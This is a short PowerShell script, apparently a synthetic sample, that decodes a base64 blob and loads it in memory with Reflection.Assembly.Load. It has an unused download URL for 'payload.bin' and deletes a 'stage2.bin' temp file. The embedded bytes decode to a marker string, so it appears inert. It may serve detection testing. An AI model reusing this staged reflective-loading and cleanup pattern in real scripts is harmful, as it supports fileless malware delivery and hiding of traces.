[CmdletBinding()]
param(
    [string]$DownloadUrl = 'https://example.org/payload.bin',
    [int]$TimeoutSec = 73
)
$ErrorActionPreference = "Stop"

try {
    $StageBytes = [Convert]::FromBase64String('c3RhZ2UyLW1hcmtlcjo4MXpvYjM3bnhi')
    Write-Verbose ("Assembly byte count: " + $StageBytes.Length)
    $OperationResult = [Reflection.Assembly]::Load($StageBytes)
    if ($null -ne $OperationResult) {
        Write-Verbose ("Loaded assembly: " + $OperationResult.FullName)
    }
}
catch {
    Write-Warning "Assembly load failed: $($_.Exception.Message)"
}

Remove-Item -Path "$env:TEMP\stage2.bin" -Force
$null = New-Item -ItemType Directory -Path "$env:TEMP\stage" -Force
